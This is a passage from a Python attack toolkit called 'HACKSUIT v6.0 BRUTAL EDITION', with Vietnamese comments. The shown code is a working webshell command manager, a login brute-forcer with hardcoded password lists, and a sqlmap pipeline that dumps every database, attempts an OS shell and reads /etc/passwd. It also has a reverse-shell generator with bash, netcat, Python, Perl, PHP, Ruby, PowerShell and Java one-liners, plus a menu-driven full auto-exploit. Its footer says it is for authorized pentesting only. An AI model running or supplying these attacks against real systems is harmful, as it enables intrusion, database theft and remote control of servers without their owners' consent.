                                        "payload": url, "method": t["method"]})
                # Lưu
                path = os.path.join(REPORT_DIR, f"cloud_{cloud}_{int(time.time())}.txt")
                with open(path, "w", encoding="utf-8") as f: f.write(r.text)
                log(f"Lưu: {path}", "OK")
                break

# ============================================================
#                    MODULE: DESERIALIZATION
# ============================================================
def deser_probe(engine):
    log("=== DESERIALIZATION PROBE ===", "DESER")
    # Java serialized payload magic bytes
    java_magic = b"\xac\xed\x00\x05"
    # PHP serialized
    php_payload = 'O:8:"stdClass":1:{s:4:"test";s:5:"hello";}'
    # Python pickle
    try:
        pickle_payload = pickle.dumps({"test": "hello"})
    except Exception:
        pickle_payload = b""
    targets = engine.extract_params()
    for t in targets:
        if t["method"] != "POST": continue
        # PHP
        d = dict(t["data"]); d[t["param"]] = php_payload
        r = engine.req(t["url"], data=d, method="POST")
        if r and "stdClass" in r.text: log(f"[?] PHP deser reflect", "DESER")
        # Java
        r = engine.req(t["url"], data=java_magic, method="POST",
                       headers={"Content-Type": "application/x-java-serialized-object"})
        if r and r.status_code == 500: log(f"[?] Java deser error possible", "DESER")

# ============================================================
#                    MODULE: WEBSHELL MANAGER
# ============================================================
def webshell_manager(shell_url):
    if not shell_url:
        shell_url = input("Webshell URL: ").strip()
    if not shell_url: return
    log(f"=== WEBSHELL MANAGER: {shell_url} ===", "WEBSHELL")
    while True:
        cmd = input(f"{C['R']}shell>{C['W']} ").strip()
        if cmd in ("exit","quit","q"): break
        if not cmd: continue
        for param in ["c","cmd","x","exec","command","system"]:
            r = requests.get(shell_url, params={param: cmd}, timeout=10, verify=False,
                             headers=rot_ua())
            if r.status_code == 200 and len(r.text) > 0:
                print(r.text[:3000]); break
        else:
            log("Không param nào hoạt động.", "WARN")

# ============================================================
#                    MODULE: BRUTE FORCE
# ============================================================
USERLIST = ["admin","administrator","root","user","test","guest","demo","manager","operator",
            "webmaster","info","support","help","staff","sysadmin","superuser","owner"]
PASSLIST = ["admin","password","123456","admin123","password123","root","toor","12345678",
            "qwerty","letmein","welcome","monkey","dragon","master","sunshine","princess",
            "1234567890","123456789","abc123","111111","000000","password1","passw0rd",
            "P@ssw0rd","P@ssword123","admin@123","Admin@123","root123","toor123","changeme",
            "secret","test","test123","demo","guest","default","temp","qwerty123","1q2w3e4r",
            "zaq12wsx","987654321","qwertyuiop","asdfghjkl","zxcvbnm","123qwe","adminadmin"]

def brute_login(engine):
    log("=== LOGIN BRUTE FORCE ===", "BRUTE")
    r = engine.req(engine.url)
    if not r: return
    forms = BeautifulSoup(r.text, "html.parser").find_all("form")
    if not forms: log("Không tìm thấy form.", "WARN"); return
    form = forms[0]
    action = urljoin(engine.url, form.get("action") or engine.url)
    user_field = next((i.get("name") for i in form.find_all("input")
                       if i.get("name") and re.search(r"user|email|login|name", i.get("name"), re.I)), "username")
    pass_field = next((i.get("name") for i in form.find_all("input")
                       if i.get("name") and i.get("type") == "password"), "password")
    fail_kw = input("Keyword thất bại (Enter=auto): ").strip() or "invalid"
    log(f"Form: {action} | user={user_field} pass={pass_field} | fail_kw='{fail_kw}'", "OK")
    # Nếu có hydra
    if tool_exists("hydra"):
        pl = "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(pl): pl = "/usr/share/wordlists/dirb/common.txt"
        if os.path.exists(pl):
            host = urlparse(engine.url).netloc.split(":")[0]
            path = urlparse(action).path or "/"
            cmd = ["hydra","-L","/dev/stdin","-P",pl,host,"-s",str(urlparse(engine.url).port or 80),
                   f"http-post-form://{path}:{user_field}=^USER^&{pass_field}=^PASS^:F={fail_kw}","-t","10"]
            log(f"Hydra rockyou...", "BRUTE")
            try:
                proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
                proc.stdin.write("\n".join(USERLIST)); proc.stdin.close()
                for line in proc.stdout: print(f"  hydra| {line.rstrip()}")
            except Exception as e: log(f"Hydra: {e}", "WARN")
    # Manual brute
    log(f"Manual brute {len(USERLIST)*len(PASSLIST)} combos...", "BRUTE")
    for u in USERLIST[:5]:
        for p in PASSLIST[:30]:
            d = {user_field: u, pass_field: p}
            rr = engine.req(action, data=d, method="POST")
            if rr and rr.status_code in (200, 302) and fail_kw.lower() not in rr.text.lower():
                log(f"[!] LOGIN OK: {u}:{p}", "VULN")
                engine.findings.append({"url": action, "param": f"{u}:{p}", "type": "brute",
                                        "method": "POST"})
                return (u, p)
    log("Không crack được.", "WARN")

# ============================================================
#           MODULE: NIKTO + SQLMAP FULL
# ============================================================
def run_nikto(url, html=False):
    if not tool_exists("nikto"): return
    ensure_dir(REPORT_DIR)
    host = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    if html:
        out = os.path.join(REPORT_DIR, f"nikto_{urlparse(url).netloc}_{int(time.time())}.html")
        log(f"Nikto full → {out}", "NIKTO")
        try:
            subprocess.run(["nikto","-h",host,"-Format","html","-o",out,"-nointeractive","-Tuning","123456789abc"],
                           capture_output=True, text=True, timeout=1800)
            log(f"Báo cáo: {out}", "OK")
        except Exception as e: log(f"Nikto error: {e}", "WARN")
    else:
        log(f"Nikto: {host}", "NIKTO")
        try:
            proc = subprocess.Popen(["nikto","-h",host,"-nointeractive","-Tuning","123456789abc"],
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in proc.stdout: print(f"  nikto| {line.rstrip()}")
            proc.wait()
        except Exception as e: log(f"Nikto error: {e}", "WARN")

def build_sqlmap_cmd(t, extra=None):
    cmd = ["sqlmap","-u",t["url"],"--batch","--random-agent","--threads=10","--risk=3","--level=5",
           "--time-sec=10","--retries=3","--technique=BEUSTQ"]
    if t.get("method") == "POST" and t.get("data"): cmd += ["--data", urlencode(t["data"])]
    if t.get("param") and t["param"] != "-": cmd += ["-p", t["param"]]
    if t.get("dbms"): cmd += ["--dbms", t["dbms"]]
    if PROXY: cmd += ["--proxy", PROXY]
    if COOKIE: cmd += ["--cookie", COOKIE]
    return cmd + (extra or [])

def sqlmap_pipeline(engine):
    if not tool_exists("sqlmap"): return
    sqli_f = [f for f in engine.findings if f.get("type","").startswith(("error","boolean","time"))]
    if not sqli_f: log("Chưa có SQLi — chạy [1].", "WARN"); return
    t = sqli_f[0]
    log("=== sqlmap PIPELINE (Aggressive) ===", "SQLMAP")
    # --dbs
    try:
        raw = subprocess.run(build_sqlmap_cmd(t, ["--dbs"]),
                             capture_output=True, text=True, timeout=3600).stdout or ""
        print(raw[-3000:])
    except subprocess.TimeoutExpired: log("Timeout --dbs.", "WARN"); return
    dbs = [re.sub(r"^\[\*\] ","",l).strip() for l in raw.splitlines() if re.match(r"^\[\*\] ",l)]
    # --dump-all
    for db in dbs[:3]:
        log(f"Dump DB: {db}", "SQLMAP")
        try:
            subprocess.run(build_sqlmap_cmd(t, ["-D", db, "--dump-all","--threads=10"]), timeout=7200)
        except subprocess.TimeoutExpired: log(f"Timeout {db}.", "WARN")
    # --os-shell
    log("Thử --os-shell...", "SQLMAP")
    try:
        subprocess.run(build_sqlmap_cmd(t, ["--os-shell"]), timeout=600)
    except Exception: pass
    # --file-read
    try:
        subprocess.run(build_sqlmap_cmd(t, ["--file-read=/etc/passwd"]), timeout=300)
    except Exception: pass
    log("sqlmap xong.", "OK")

# ============================================================
#           MODULE: REVERSE SHELL
# ============================================================
def rev_shell_gen():
    log("=== REVERSE SHELL GENERATOR ===", "SHELL")
    ip = input("LHOST: ").strip()
    port = input("LPORT (4444): ").strip() or "4444"
    shell = f"""# === Reverse Shell Cheatsheet LHOST={ip} LPORT={port} ===
# Bash:
bash -i >& /dev/tcp/{ip}/{port} 0>&1
bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done

# Netcat:
nc -e /bin/sh {ip} {port}
nc -c bash {ip} {port}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f
nc {ip} {port} | /bin/bash | nc {ip} {port}

# Python:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# Perl:
perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'

# PHP:
php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("{ip}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby:
ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'

# PowerShell:
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbyte=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbyte,0,$sbyte.Length);$s.Flush()}};$c.Close()"

# Java:
Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"});

# Groovy:
String host="{ip}";int port={port};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}};}};p.destroy();s.close();

# Listener:
nc -lvnp {port}
rlwrap nc -lvnp {port}
"""
    path = os.path.join(REPORT_DIR, f"revshell_{ip}_{port}.txt")
    ensure_dir(REPORT_DIR)
    with open(path, "w") as f: f.write(shell)
    print(shell)
    log(f"Đã lưu: {path}", "OK")

# ============================================================
#           MODULE: SCREENSHOT
# ============================================================
def screenshot_url(url, path="reports/screen.png"):
    try:
        ensure_dir(REPORT_DIR)
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            opts = Options(); opts.add_argument("--headless"); opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            d = webdriver.Chrome(options=opts)
            d.set_page_load_timeout(30); d.get(url)
            time.sleep(2); d.save_screenshot(path); d.quit()
            log(f"Screenshot: {path}", "SCREEN"); return path
        except ImportError:
            if shutil.which("wkhtmltoimage"):
                subprocess.run(["wkhtmltoimage", url, path], timeout=30)
                log(f"wkhtml: {path}", "SCREEN"); return path
            log("Cần: pip install selenium + chromedriver", "WARN")
    except Exception as e: log(f"Screenshot error: {e}", "WARN")
    return None

# ============================================================
#           MODULE: REPORT
# ============================================================
SEVERITY = {
    "rce":"CRITICAL","rce-time":"CRITICAL","error-based":"CRITICAL","lfi":"HIGH",
    "ssrf":"HIGH","ssrf-oob":"HIGH","boolean-based":"HIGH","time-based":"HIGH","boolean-based-numeric":"HIGH",
    "brute":"HIGH","xxe":"CRITICAL","ssti":"CRITICAL","nosql":"HIGH","jwt-brute":"CRITICAL",
    "graphql":"MEDIUM","cors":"HIGH","crlf":"MEDIUM","open_redirect":"MEDIUM",
    "host_header":"MEDIUM","api":"INFO","dir":"LOW","subdomain":"INFO",
    "sensitive_file":"HIGH","xss":"MEDIUM","csrf":"MEDIUM","csrf-novalidate":"MEDIUM",
    "info":"INFO","webshell":"CRITICAL","cloud_metadata":"CRITICAL",
    "subdomain_takeover":"CRITICAL","shellshock":"CRITICAL","struts2-rce":"CRITICAL",
}
RISK_COLOR = {"CRITICAL":"danger","HIGH":"warning","MEDIUM":"warning","LOW":"info","INFO":"secondary"}

def export_html_report(engine, target_url=""):
    ensure_dir(REPORT_DIR)
    path = os.path.join(REPORT_DIR, f"report_{int(time.time())}.html")
    findings = sorted(engine.findings,
                      key=lambda f: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
                          .get(SEVERITY.get(f.get("type","info"),"INFO"), 5))
    counts = {}
    for f in engine.findings:
        s = SEVERITY.get(f.get("type","info"), "INFO")
        counts[s] = counts.get(s, 0) + 1
    rows = ""
    for i, f in enumerate(findings):
        vtype = f.get("type","info")
        sev = SEVERITY.get(vtype, "INFO")
        badge = RISK_COLOR.get(sev, "secondary")
        rows += f"""<tr>
          <td>{i+1}</td>
          <td><span class="badge bg-{badge}">{sev}</span></td>
          <td><span class="badge bg-dark">{vtype}</span></td>
          <td><code>{f.get('method','-')}</code></td>
          <td style="word-break:break-all">{f.get('url','')[:90]}</td>
          <td><code>{f.get('param','-')}</code></td>
          <td style="word-break:break-all"><code>{f.get('payload','-')[:150]}</code></td>
        </tr>"""
    count_html = " ".join(
        f'<span class="badge bg-{RISK_COLOR.get(s,"secondary")}">{s}: {n}</span>'
        for s, n in sorted(counts.items()))
    html = f"""<!DOCTYPE html>
<html lang="vi"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>HACKSUIT v6.0 — Pentest Report</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>body{{background:#0a0e27;color:#eee}}.card{{background:#16213e;border:1px solid #e94560}}.table{{color:#eee}}h1{{color:#e94560}}code{{color:#f39c12}}</style>
</head><body><div class="container py-4">
  <h1>⚡ HACKSUIT v6.0 BRUTAL EDITION — Báo cáo Pentest</h1>
  <div class="card mb-3"><div class="card-body">
    <p><strong>Target:</strong> {target_url or engine.url or 'N/A'}</p>
    <p><strong>Thời gian:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
    <p><strong>WAF:</strong> {engine.waf or 'Không phát hiện'}</p>
    <p><strong>DBMS:</strong> {engine.dbms or 'N/A'}</p>
    <p><strong>Webshell:</strong> {engine.shell_url or 'N/A'}</p>
    <p><strong>Tổng findings:</strong> {len(engine.findings)} &nbsp; {count_html}</p>
  </div></div>
  <div class="card mb-3"><div class="card-body table-responsive">
    <h5>Danh sách phát hiện</h5>
    <table class="table table-striped table-hover">
      <thead><tr><th>#</th><th>Mức độ</th><th>Loại</th><th>Method</th><th>URL</th><th>Param</th><th>Payload</th></tr></thead>
      <tbody>{rows or '<tr><td colspan="7" class="text-center">Không có findings.</td></tr>'}</tbody>
    </table>
  </div></div>
  <div class="card"><div class="card-body">
    <h5>Khuyến nghị remediation</h5>
    <ul>
      <li><strong>SQLi/NoSQL:</strong> prepared statements, ORM, validate input.</li>
      <li><strong>XSS:</strong> escape output theo context, CSP header.</li>
      <li><strong>LFI/RCE:</strong> whitelist path, không gọi shell với input.</li>
      <li><strong>SSRF:</strong> whitelist outbound, chặn metadata endpoints.</li>
      <li><strong>XXE:</strong> tắt external entity trong XML parser.</li>
      <li><strong>SSTI:</strong> sandbox template engine.</li>
      <li><strong>JWT:</strong> RS256, không alg=none, secret mạnh.</li>
      <li><strong>CORS:</strong> whitelist origin.</li>
      <li><strong>CSRF:</strong> token per-session, SameSite=Strict.</li>
      <li><strong>Log4Shell/Spring4Shell:</strong> update library.</li>
    </ul>
  </div></div>
  <p class="text-muted mt-3 text-center">HACKSUIT v6.0 — Chỉ dùng cho pentest được ủy quyền</p>
</div></body></html>"""
    with open(path, "w", encoding="utf-8") as f: f.write(html)
    log(f"HTML: {path}", "OK")
    try: webbrowser.open(f"file://{os.path.abspath(path)}")
    except Exception: pass
    return path

def export_json_report(engine):
    path = os.path.join(REPORT_DIR, f"report_{int(time.time())}.json")
    data = {"target": engine.url, "waf": engine.waf, "dbms": engine.dbms,
            "shell_url": engine.shell_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "findings": engine.findings}
    with open(path, "w", encoding="utf-8") as f: json.dump(data, f, indent=2, ensure_ascii=False)
    log(f"JSON: {path}", "OK"); return path

def export_csv_report(engine):
    path = os.path.join(REPORT_DIR, f"report_{int(time.time())}.csv")
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["#","Type","Severity","Method","URL","Param","Payload"])
        for i, x in enumerate(engine.findings, 1):
            sev = SEVERITY.get(x.get("type","info"), "INFO")
            w.writerow([i, x.get("type"), sev, x.get("method"), x.get("url"), x.get("param"), x.get("payload")])
    log(f"CSV: {path}", "OK"); return path

# ============================================================
#           MAIN / MENU
# ============================================================
engine = None

def pick_target(targets):
    for i, t in enumerate(targets):
        print(f"  [{i}] {t.get('method','-'):4} {t.get('param','-'):15} {t.get('type','')}")
    idx = input("Số thứ tự (default 0): ").strip()
    try: return targets[int(idx) if idx else 0]
    except (IndexError, ValueError): return targets[0]

def ask_url():
    if not engine.url:
        u = input(f"{C['Y']}Nhập URL: {C['W']}").strip()
        if not u: return False
        if not u.startswith(("http://","https://")): u = "http://" + u
        engine.url = u
        log(f"Target: {u}", "OK")
    return True

def show_findings():
    if not engine.findings: log("Chưa có findings.", "WARN"); return
    print(f"\n{C['G']}--- FINDINGS ({len(engine.findings)}) ---{C['W']}")
    for i, f in enumerate(engine.findings):
        sev = SEVERITY.get(f.get("type","info"), "INFO")
        print(f"  [{i}] {sev:8} {f.get('type','?'):20} {f.get('param','-'):15} {f.get('url','')[:60]}")

def run_full_auto():
    log("=== FULL AUTO ===", "OK")
    engine.detect_waf()
    dir_fuzz(engine); subdomain_enum(engine); cms_scan(engine); api_scan(engine); ssl_scan(engine)
    xss_scan(engine); lfi_scan(engine); rce_scan(engine); ssrf_scan(engine); csrf_check(engine)
    xxe_scan(engine); ssti_scan(engine); nosql_scan(engine); graphql_scan(engine)
    cors_scan(engine); crlf_scan(engine); open_redirect_scan(engine); host_header_scan(engine)
    log4shell_probe(engine); spring4shell_probe(engine); shellshock_probe(engine); struts2_probe(engine)
    ts = engine.extract_params()
    for t in ts:
        res = engine.sqli_detect(t)
        if res:
            t.update(res); engine.findings.append(t)
            engine.dbms = engine.dbms or res["dbms"]
            log(f"[!] SQLi: {t['param']} — {res['type']} ({res['dbms']})", "VULN")
    sqlmap_pipeline(engine)
    cloud_metadata_scan(engine)
    show_findings()
    export_html_report(engine, target_url=engine.url)
    export_json_report(engine); export_csv_report(engine)
    log("=== DONE ===", "OK")

def main():
    global PROXY, COOKIE, AUTH, engine
    requests.packages.urllib3.disable_warnings()
    parser = argparse.ArgumentParser(description="HACKSUIT v6.0 BRUTAL")
    parser.add_argument("url", nargs="?", default=None)
    parser.add_argument("-c", "--cookie")
    parser.add_argument("-p", "--proxy")
    parser.add_argument("--auth", help="user:pass")
    args = parser.parse_args()
    PROXY = args.proxy; COOKIE = args.cookie
    if args.auth and ":" in args.auth:
        u, p = args.auth.split(":", 1); AUTH = (u, p)
    engine = Engine(args.url, cookie=COOKIE)
    banner()
    for tool in ["nikto","sqlmap","nmap","hydra"]:
        tool_exists(tool)

    while True:
        print(f"""
{C['G']}========= HACKSUIT v6.0 BRUTAL EDITION ========={C['W']}
 Target: {engine.url or f"{C['Y']}chưa đặt{C['W']}"}  |  WAF: {engine.waf or '—'}
--- Setup ---
 [99] Đặt/đổi URL              [2]  Xem findings
--- SQLi (Aggressive) ---
 [1]  Quét SQLi toàn params    [3]  Full auto-exploit SQLi
 [4]  DB info                  [5]  List databases
 [6]  List tables              [7]  List columns
 [8]  DUMP 1 table             [50] DUMP ALL databases
 [9]  Boolean-blind extract    [10] Đọc file (LOAD_FILE)
 [11] WAF bypass chain         [12] Payload thủ công
 [30] MySQL webshell upload    [31] MSSQL xp_cmdshell RCE
 [52] OOB MySQL                [53] OOB MSSQL
--- Web attacks ---
 [13] XSS (Advanced)           [14] LFI Scanner
 [15] RCE Scanner              [27] SSRF + Cloud metadata
 [28] CSRF Check               [32] XXE Scanner
 [33] SSTI Scanner             [34] NoSQL Injection
 [35] JWT Attack               [36] GraphQL Discovery
 [37] CORS Misconfig           [38] CRLF Injection
 [39] Open Redirect            [40] Host Header Injection
 [41] 403 Bypass               [54] Deserialization probe
--- CVE Probes ---
 [55] Log4Shell                [56] Spring4Shell
 [57] Shellshock               [58] Struts2 RCE
--- Recon ---
 [16] Directory Fuzz (MASSIVE) [17] Port Scan (Aggressive)
 [18] Subdomain + Takeover     [19] CMS Detection
 [42] API Discovery            [43] SSL/TLS Analysis
 [44] WAF Detection            [60] Cloud metadata (SSRF)
--- Tools ---
 [20] Nikto quick              [21] Nikto full HTML
 [22] sqlmap auto              [23] sqlmap FULL pipeline
 [24] Brute Login
--- Exploit ---
 [45] Reverse Shell Generator  [46] Screenshot URL
 [61] Webshell Manager         [25] FULL AUTO + report
--- Report ---
 [29] HTML   [47] JSON   [48] CSV   [26] View reports/
 [0]  Thoát""")
        ch = input("Chọn: ").strip()
        need_url = ch in ("1","13","14","15","16","17","18","19","20","21","22","25","27","28","32","33","34","36","37","38","39","40","42","43","44","24","46","50","52","53","54","55","56","57","58","60")
        if need_url and not ask_url(): continue

        if ch == "99": engine.url = None; ask_url()
        elif ch == "1":
            ts = engine.extract_params()
            log(f"{len(ts)} param(s)", "OK")
            engine.findings = [f for f in engine.findings if not f.get("type","").startswith(("error","boolean","time"))]
            for t in ts:
                res = engine.sqli_detect(t)
                if res:
                    t.update(res); engine.findings.append(t)
                    engine.dbms = engine.dbms or res["dbms"]
                    log(f"[!] SQLi: {t['param']} — {res['type']} ({res['dbms']})", "VULN")
        elif ch == "2": show_findings()
        elif ch in ("3","4","5","6","7","8","9","10","11","12","30","31","50","52","53"):
            sqli_f = [f for f in engine.findings if f.get("type","").startswith(("error","boolean","time"))]
            if not sqli_f: log("Chưa có SQLi — chạy [1].", "WARN"); continue
            t = sqli_f[0] if len(sqli_f)==1 else pick_target(sqli_f)
            engine.current = t
            if ch == "3":
                r = engine.inject(t, "'")
                engine.dbms = engine.dbms or (engine.detect_dbms(r.text) if r else None)
                engine.waf_bypass()
                if engine.find_union(): engine.sqli_info()
            elif ch in ("4","5","6","7","8","50"):
                if engine.ncols is None and not engine.find_union(): continue
                if ch == "4": engine.sqli_info()
                elif ch == "5": engine.sqli_dbs()
                elif ch == "6": engine.sqli_tables(input("DB (Enter=current): ").strip() or None)
                elif ch == "7": engine.sqli_cols(input("Table: ").strip())
                elif ch == "8":
                    tbl = input("Table: ").strip()
                    cols = input("Cols (comma): ").strip().split(",")
                    engine.sqli_dump(tbl, cols)
                elif ch == "50": engine.sqli_dump_all()
            elif ch == "9":
                q = input("Query: ").strip()
                result = ""
                for i in range(1, 300):
                    ok = False
                    for c in (string.ascii_letters + string.digits + "@._-{}$!#%^&*()"):
                        r1 = engine.send(f"' AND ASCII(SUBSTRING(({q}),{i},1))={ord(c)}-- -")
                        r2 = engine.send(f"' AND ASCII(SUBSTRING(({q}),{i},1))=0-- -")
                        if r1 and r2 and len(r1.text) != len(r2.text):
                            result += c; sys.stdout.write(c); sys.stdout.flush(); ok = True; break
                    if not ok: break
                print(f"\n  => {result or '(fail)'}")
            elif ch == "10":
                if engine.ncols is None: engine.find_union()
                engine.sqli_readfile(input("Path: ").strip())
            elif ch == "11": engine.waf_bypass()
            elif ch == "12":
                r = engine.send(input("Payload: ").strip())
                print(r.text[:3000] if r else "No response")
            elif ch == "30": engine.sqli_rce_mysql()
            elif ch == "31": engine.sqli_mssql_rce(input("Cmd (whoami): ").strip() or "whoami")
            elif ch == "52": engine.sqli_oob_mysql(input("Collab domain: ").strip())
            elif ch == "53": engine.sqli_oob_mssql(input("Collab domain: ").strip())
        elif ch == "13": xss_scan(engine)
        elif ch == "14": lfi_scan(engine)
        elif ch == "15": rce_scan(engine)
        elif ch == "27":
            token = input("Webhook.site token (Enter=internal): ").strip()
            ssrf_scan(engine, oob_token=token or None)
        elif ch == "28": csrf_check(engine)
        elif ch == "32": xxe_scan(engine)
        elif ch == "33": ssti_scan(engine)
        elif ch == "34": nosql_scan(engine)
        elif ch == "35": jwt_scan(engine)
        elif ch == "36": graphql_scan(engine)
        elif ch == "37": cors_scan(engine)
        elif ch == "38": crlf_scan(engine)
        elif ch == "39": open_redirect_scan(engine)
        elif ch == "40": host_header_scan(engine)
        elif ch == "41": bypass_403(engine)
        elif ch == "54": deser_probe(engine)
        elif ch == "55": log4shell_probe(engine)
        elif ch == "56": spring4shell_probe(engine)
        elif ch == "57": shellshock_probe(engine)
        elif ch == "58": struts2_probe(engine)
        elif ch == "16": dir_fuzz(engine)
        elif ch == "17": port_scan(engine)
        elif ch == "18": subdomain_enum(engine, takeover=True)
        elif ch == "19": cms_scan(engine)
        elif ch == "42": api_scan(engine)
        elif ch == "43": ssl_scan(engine)
        elif ch == "44": engine.detect_waf()
        elif ch == "60": cloud_metadata_scan(engine)
        elif ch == "20": run_nikto(engine.url, html=False)
        elif ch == "21": run_nikto(engine.url, html=True)
        elif ch == "22":
            if shutil.which("sqlmap"):
                try: subprocess.run(["sqlmap","-u",engine.url,"--batch","--random-agent","--level=5","--risk=3"], timeout=3600)
                except subprocess.TimeoutExpired: log("Timeout.", "WARN")
        elif ch == "23": sqlmap_pipeline(engine)
        elif ch == "24": brute_login(engine)
        elif ch == "25": run_full_auto()
        elif ch == "29": export_html_report(engine, target_url=engine.url)
        elif ch == "45": rev_shell_gen()
        elif ch == "46":
            p = screenshot_url(engine.url)
            if p: log(f"Screenshot: {p}", "OK")
        elif ch == "61": webshell_manager(engine.shell_url)
        elif ch == "47": export_json_report(engine)
        elif ch == "48": export_csv_report(engine)
        elif ch == "26":
            found = False
            for root, _, files in os.walk(REPORT_DIR):
                for f in files:
                    print(f"  {os.path.join(root,f)}"); found = True
            if not found: log("reports/ trống.", "WARN")
        elif ch == "0": print("Bye."); sys.exit(0)
        else: log("Lựa chọn không hợp lệ.", "WARN")

if __name__ == "__main__":
    main()